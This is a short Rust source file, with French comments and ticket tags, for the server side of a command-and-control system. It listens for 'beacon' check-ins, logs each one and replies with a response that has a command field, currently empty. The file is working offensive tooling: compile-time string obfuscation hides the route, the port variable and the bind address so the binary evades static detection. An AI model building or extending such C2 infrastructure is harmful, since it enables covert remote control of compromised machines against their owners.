// VIR-28 : HTTP ping-pong avec obfuscation obfstr
// VIR-30 : migration vers HTTPS + TLS (tokio-rustls)

use axum::{routing::post, Json, Router};
use obfstr::obfstr;
use shared::{BeaconPing, BeaconPong};
use tokio::net::TcpListener;

async fn handle_ping(Json(ping): Json<BeaconPing>) -> Json<BeaconPong> {
    println!(
        "[+] Beacon #{} checked in  ts={}",
        ping.id, ping.ts
    );
    Json(BeaconPong {
        id: ping.id,
        cmd: None,
    })
}

#[tokio::main]
async fn main() {
    // Routes obfusquées à la compilation — "/ping" absent en clair dans le binaire
    let route = obfstr!("/ping").to_string();
    let app = Router::new().route(&route, post(handle_ping));

    let port: u16 = std::env::var(obfstr!("C2_PORT"))
        .ok()
        .and_then(|p| p.parse().ok())
        .unwrap_or(8080);

    let addr = format!("{}:{}", obfstr!("0.0.0.0"), port);
    let listener = TcpListener::bind(&addr).await.unwrap();
    println!("[*] C2 listening on http://0.0.0.0:{}", port);

    axum::serve(listener, app).await.unwrap();
}
